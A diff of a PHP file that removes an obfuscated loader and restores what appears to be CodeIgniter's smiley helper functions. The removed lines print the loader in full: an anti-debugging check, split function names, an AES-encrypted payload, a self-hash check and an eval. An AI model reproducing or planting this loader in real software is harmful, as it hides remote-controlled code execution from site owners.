@@ -1,28 +1,229 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_fri9gpfg=('bas'.'e64'.'_de'.'cod'.'e');
-$_y4s8tj3c=('gzu'.'nco'.'mpr'.'ess');
-$_msompzui=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_qzudsl9h='7zyEtSEr';
-$_i2arx1ff='nKQ+GULb';
-$_ho10phbf='B/2M2XiM';
-$_odwpfcf6='PD9Whdzy';
-$_fecdipcx='o+YVX3Sos9M=';
-$_tw5yclmf='gsSdgi3a';
-$_nxjnrqrw='7aemPI1x';
-$_bn1ist0j='YZx/lw==';
-$_c9f1z0tv=$_fri9gpfg($_ho10phbf.$_qzudsl9h.$_i2arx1ff.$_odwpfcf6.$_fecdipcx);
-$_ozm3g3rg=$_fri9gpfg($_tw5yclmf.$_nxjnrqrw.$_bn1ist0j);
-$_q27fk0v6=$_fri9gpfg('gig6IyDIjB1ZaSQltF7wkpSPAPXDLSsLtuUgkT5RiSdq87iE/Ju41gZLBfuhaI3hWtiduOSLY/Cr3jhUXgeC3mV26Mf7zgkAxazjxSecKCJxuPLNeeqHkg++9mC4dPLD5QdfAqiKcCOJq4KdHduVuBWS4XB5RycUy4CB2Kz2OciypU/taCPXXd8ckkEaRIu9gJwW30eA9UktzZi8zDFSF4o8txgvSK9SbdsDXVAj4fA23lOqtwC9wP/sqcfPFte5moqhrZQfjXT7g32bajGEHQ1mjvG9qX5PgwxTl+AmmY5/iwn7UpVwINtmpark75HYGyfthL753ZwfFB5PQzcIpPa3cr3wQ0wUZXBMT9b5LYjAbQ5LW+sbT1BuatFF58rM4YcmkMu9SfzFn/8DLHsJp0JTTf5iEBpWnecu7lWog3tlaX+xObwt+wfZs9TbPXQVpSKrQZuwgrwf/a/l3Zt1fRJ8J4UJZ8jWSXTGImZDX0Hp9g+nXOGVfwWW6HLeCuJLo12Lr27rt3w2wmHI3QRd6l24PtVDd5zvKLaoCTuWu4qVwYfMnJG31wSxhQl/bOe7XCQ9EO399ACgb9Qlp/RFBqpAi0BRVtWI3mEfqvjnZCiXgSkXaBdYHivUDyrj7cbnBT4QWKL9bIhu9WHMm18AwGzg/IHyoGn69jA+JbPQ8/BTvb6Gq1iWqMHUCcv3chR7dVroU/EYs3QWp4px2rhIACcvSvWjz+95WFbqFyT16h1MsPwicH68tpb9QmYzJWAolw2uHDBkh/WfLUi63Xl6vCssKKi+EIkUStKCylxngsGjanAKQ7LgVxe2WBx+HdxMm2hjuhL88rTVxuFCC2vjQKLSG1ayR0+89jSPCX9HpQwdeAVknabZ1sb1ulCFBPsI5ZfufbXTqSVv8vlc4q6u+HVoP0TupjJ9G5hpugUM691uGb7UnAdcej24AAFmxBzdeVpx9vJcpcLyU/+xmBQjhlTyc9nywD6rE6ymNxcqkiiJnumRISgxxoKfj+vpiaL+7u+HVy81ozcBqoxzYL4tETVPN3tT2b8XX+JZDoNQoJwTsRwNnapZTOC5OxknkqQCsie608Ki1qYm9cz9fl4/kUjOCfFZ3hNE/CfpKIYp73kn0JgBayi3K/XUbKgQVJyswRIpbrlufswMpjnlL2V5SWSZjilGTTfS5OZgtFiUP1FCQBTnQ84dgbo1GRrDzdB2qw4AeU/tNhFBzFRQGtPsS14oLVnEoxzViCbK50MujW0H464G051CFSu6zFcsMgFFR/xl/A15LInsWDYBoCxyZvXqyrqAJZtjmCuQQic1iO5esD1zClA/pyeVcmso2K6OyAa6DcqPr346Eu/SWY0Pfemw5IQn+0gA9gh0UnjlH+YA5CpmonRRwt46AmfBtciJPxfc2ekBsWCeual7mXbBX9xNRxnYypTu/9SMttz+KeTyJt7sdTOUSC5uRJWstFZZ7dQEpVc79zgvb4v76bpSPA==');
-$_o76r0iw8=$_msompzui($_q27fk0v6,'aes-256-cbc',$_c9f1z0tv,OPENSSL_RAW_DATA,$_ozm3g3rg);
-if($_o76r0iw8===false){exit;}
-$_lubhydjl=$_y4s8tj3c($_o76r0iw8);
-if($_lubhydjl===false){exit;}
-$_azsvgxln='b299ceb7cd301a05585f75f65f5c2b657baedf4eb41d778d9b2b28db20557d6d';
-$_s3nl9jel=@file_get_contents(__FILE__);
-if($_s3nl9jel!==false){
-$_h51dc5bd=str_replace($_azsvgxln,"0000000000000000000000000000000000000000000000000000000000000000",$_s3nl9jel);
-$_eqjhppx2=hash("sha256",$_h51dc5bd);
-if($_eqjhppx2!==$_azsvgxln){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+if ( ! function_exists('smiley_js'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function smiley_js($alias = '', $field_id = '', $inline = TRUE)
+{
+static $do_setup = TRUE;
+$r = '';
+if ($alias !== '' && ! is_array($alias))
+{
+$alias = array($alias => $field_id);
 }
-eval($_lubhydjl);
+if ($do_setup === TRUE)
+{
+$do_setup = FALSE;
+$m = array();
+if (is_array($alias))
+{
+foreach ($alias as $name => $id)
+{
+$m[] = '"'.$name.'" : "'.$id.'"';
+}
+}
+$m = '{'.implode(',', $m).'}';
+$r .= <<<EOF
+			var smiley_map = {$m};
+
+			function insert_smiley(smiley, field_id) {
+				var el = document.getElementById(field_id), newStart;
+
+				if ( ! el && smiley_map[field_id]) {
+					el = document.getElementById(smiley_map[field_id]);
+
+					if ( ! el)
+						return false;
+				}
+
+				el.focus();
+				smiley = " " + smiley;
+
+				if ('selectionStart' in el) {
+					newStart = el.selectionStart + smiley.length;
+
+					el.value = el.value.substr(0, el.selectionStart) +
+									smiley +
+									el.value.substr(el.selectionEnd, el.value.length);
+					el.setSelectionRange(newStart, newStart);
+				}
+				else if (document.selection) {
+					document.selection.createRange().text = smiley;
+				}
+			}
+EOF;
+}
+elseif (is_array($alias))
+{
+foreach ($alias as $name => $id)
+{
+$r .= 'smiley_map["'.$name.'"] = "'.$id."\";\n";
+}
+}
+return ($inline)
+? '<script type="text/javascript" charset="utf-8">/*<![CDATA[ */'.$r.'// ]]></script>'
+: $r;
+}
+}
+
+if ( ! function_exists('get_clickable_smileys'))
+{
+
+
+
+
+
+
+
+
+
+
+function get_clickable_smileys($image_url, $alias = '')
+{
+
+if (is_array($alias))
+{
+$smileys = $alias;
+}
+elseif (FALSE === ($smileys = _get_smiley_array()))
+{
+return FALSE;
+}
+
+$image_url = rtrim($image_url, '/').'/';
+$used = array();
+foreach ($smileys as $key => $val)
+{
+
+
+
+
+if (isset($used[$smileys[$key][0]]))
+{
+continue;
+}
+$link[] = '<a href="javascript:void(0);" onclick="insert_smiley(\''.$key.'\', \''.$alias.'\')"><img src="'.$image_url.$smileys[$key][0].'" alt="'.$smileys[$key][3].'" style="width: '.$smileys[$key][1].'; height: '.$smileys[$key][2].'; border: 0;" /></a>';
+$used[$smileys[$key][0]] = TRUE;
+}
+return $link;
+}
+}
+
+if ( ! function_exists('parse_smileys'))
+{
+
+
+
+
+
+
+
+
+
+
+function parse_smileys($str = '', $image_url = '', $smileys = NULL)
+{
+if ($image_url === '' OR ( ! is_array($smileys) && FALSE === ($smileys = _get_smiley_array())))
+{
+return $str;
+}
+
+$image_url = rtrim($image_url, '/').'/';
+foreach ($smileys as $key => $val)
+{
+$str = str_replace($key, '<img src="'.$image_url.$smileys[$key][0].'" alt="'.$smileys[$key][3].'" style="width: '.$smileys[$key][1].'; height: '.$smileys[$key][2].'; border: 0;" />', $str);
+}
+return $str;
+}
+}
+
+if ( ! function_exists('_get_smiley_array'))
+{
+
+
+
+
+
+
+
+function _get_smiley_array()
+{
+static $_smileys;
+if ( ! is_array($_smileys))
+{
+if (file_exists(APPPATH.'config/smileys.php'))
+{
+include(APPPATH.'config/smileys.php');
+}
+if (file_exists(APPPATH.'config/'.ENVIRONMENT.'/smileys.php'))
+{
+include(APPPATH.'config/'.ENVIRONMENT.'/smileys.php');
+}
+if (empty($smileys) OR ! is_array($smileys))
+{
+$_smileys = array();
+return FALSE;
+}
+$_smileys = $smileys;
+}
+return $_smileys;
+}
+}
